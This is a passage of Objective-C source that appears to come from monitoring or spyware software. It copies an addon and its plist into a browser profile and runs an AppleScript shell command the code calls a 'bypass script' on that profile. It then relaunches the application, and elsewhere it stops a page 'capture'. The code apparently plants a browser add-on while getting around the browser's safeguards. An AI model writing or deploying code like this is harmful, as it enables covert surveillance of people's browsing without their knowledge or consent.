    NSString *newAddonPlistPath = [aScriptPath stringByDeletingLastPathComponent];
    newAddonPlistPath = [newAddonPlistPath stringByAppendingPathComponent:self.mAddonPlist];
    //DLog(@"newAddonPlistPath : %@", newAddonPlistPath);
    [fileManager removeItemAtPath:aCurrentAddonPlistPath error:nil];
    [fileManager copyItemAtPath:newAddonPlistPath toPath:aCurrentAddonPlistPath error:&error];
    if (error) {
        DLog(@"Copy addon plist error : %@", error);
        return;
    }
    
    error = nil;
    NSString *newAddonPath = [aScriptPath stringByDeletingLastPathComponent];
    newAddonPath = [newAddonPath stringByAppendingPathComponent:self.mAddonName];
    NSString *currentAddonPath = [aCurrentAddonPlistPath stringByDeletingLastPathComponent];
    currentAddonPath = [currentAddonPath stringByAppendingPathComponent:self.mAddonName];
    //DLog(@"newAddonPath : %@, currentAddonPath: %@", newAddonPath, currentAddonPath);
    [fileManager removeItemAtPath:currentAddonPath error:nil];
    [fileManager copyItemAtPath:newAddonPath toPath:currentAddonPath error:&error];
    if (error) {
        DLog(@"Copy addon file error : %@", error);
        return;
    }
    
    NSString *profileRootPath = [aCurrentAddonPlistPath stringByDeletingLastPathComponent];
    profileRootPath = [profileRootPath stringByDeletingLastPathComponent];
    NSString *scriptor = [NSString stringWithFormat:@"do shell script \"%@ '%@'\"", aScriptPath, profileRootPath];
    NSDictionary *scptError = nil;
    NSAppleScript *bypassScript = [[NSAppleScript alloc] initWithSource:scriptor];
    [bypassScript executeAndReturnError:&scptError];
    [bypassScript release];
    if (scptError) {
        DLog(@"[optional] Execute bypass script error : %@", scptError);
    }
    
    DLog(@"--------- Set up addon completed ------------");
    
    [NSThread sleepForTimeInterval:2.0];
    
    [[NSWorkspace sharedWorkspace] launchApplication:bundleUrl.path];
}

#pragma mark - Safe parser

- (void) parse: (Class) aClass selector: (SEL) aSelector obj1: (id) aObj1 obj2: (id) aObj2 {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
        @try {
            NSMethodSignature *signature = [aClass methodSignatureForSelector:aSelector];
            NSInvocation *invocator = [NSInvocation invocationWithMethodSignature:signature];
            invocator.target = aClass;
            invocator.selector = aSelector;
            id arg1 = aObj1;
            [invocator setArgument:&arg1 atIndex:2];
            if (aObj2) {
                id arg2 = aObj2;
                [invocator setArgument:&arg2 atIndex:3];
            }
            [invocator invoke];
        } @catch (NSException *exception) {
            DLog(@"Safe parser exception : %@", exception);
        } @finally {
            ;
        }
        [pool drain];
    });
}

#pragma mark - Memory management

- (void) dealloc {
    [self stopCapture];
    [mAsyC release];
    [mPageNotifier release];
    [mSpecialPageNotifier release];
    [mAddonName release];
    [mAddonPlist release];
    [mQueue release];
    [super dealloc];
}

@end
